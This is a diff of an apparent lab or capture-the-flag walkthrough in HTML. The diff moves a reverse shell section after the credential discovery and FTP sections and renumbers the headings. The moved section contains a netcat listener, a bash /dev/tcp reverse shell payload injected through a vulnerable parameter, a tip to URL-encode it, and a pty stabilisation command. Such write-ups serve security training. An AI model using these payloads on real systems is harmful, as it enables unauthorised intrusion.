@@ -95,40 +95,8 @@ This confirmed remote command execution as the web server user.
 
 <hr>
 
-<h2>4. Reverse Shell</h2>
 
-<p>
-While command execution was possible through the web interface, interaction was limited. 
-To gain a more stable and interactive shell, I needed to establish a reverse shell.
-</p>
-
-<pre><code>nc -lvnp 443</code></pre>
-
-<p>
-Then I used a reverse shell payload through the vulnerable parameter:
-</p>
-
-<pre><code>/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.0.2.10/443 0&gt;&amp;1'</code></pre>
-
-<p>
-After executing the payload, I received a shell on my listener.
-</p>
-<strong>IMPORTANT NOTE: Payload must be encoded in order to work as expected. I used an online url encoder. <br>
-<br><img width="1160" height="326" alt="image" src="https://github.com/user-attachments/assets/79e98c55-e464-40ff-a306-a4365e0f28d9" />
-
-
-
-<p>
-To stabilize the shell:
-</p>
-<img width="1076" height="150" alt="image" src="https://github.com/user-attachments/assets/50e612b4-3200-4879-a254-19eae8dd7477" />
-
-<pre><code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
-
-
-<hr>
-
-<h2>5. Credential Discovery</h2>
+<h2>4. Credential Discovery</h2>
 
 <p>
 With command execution available, I explored the web directory:
@@ -160,7 +128,7 @@ This file contained credentials:
 
 <hr>
 
-<h2>6. Credential Validation (FTP)</h2>
+<h2>5. Credential Validation (FTP)</h2>
 
 <p>
 Since FTP was open, I tested the discovered credentials.
@@ -192,6 +160,38 @@ I listed available files:
 <pre><code>ls</code></pre>
 
 <img width="919" height="388" alt="image" src="https://github.com/user-attachments/assets/e29f0565-4901-4d8d-b636-9ce79a3aabc6" />
+
+
+<hr>
+<h2>6. Reverse Shell</h2>
+
+<p>
+While command execution was possible through the web interface, interaction was limited. 
+To gain a more stable and interactive shell, I needed to establish a reverse shell.
+</p>
+
+<pre><code>nc -lvnp 443</code></pre>
+
+<p>
+Then I used a reverse shell payload through the vulnerable parameter:
+</p>
+
+<pre><code>/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.0.2.10/443 0&gt;&amp;1'</code></pre>
+
+<p>
+After executing the payload, I received a shell on my listener.
+</p>
+<strong>IMPORTANT NOTE: Payload must be encoded in order to work as expected. I used an online url encoder. <br>
+<br><img width="1160" height="326" alt="image" src="https://github.com/user-attachments/assets/79e98c55-e464-40ff-a306-a4365e0f28d9" />
+
+
+
+<p>
+To stabilize the shell:
+</p>
+<img width="1076" height="150" alt="image" src="https://github.com/user-attachments/assets/50e612b4-3200-4879-a254-19eae8dd7477" />
+
+<pre><code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
 
 
 <hr>
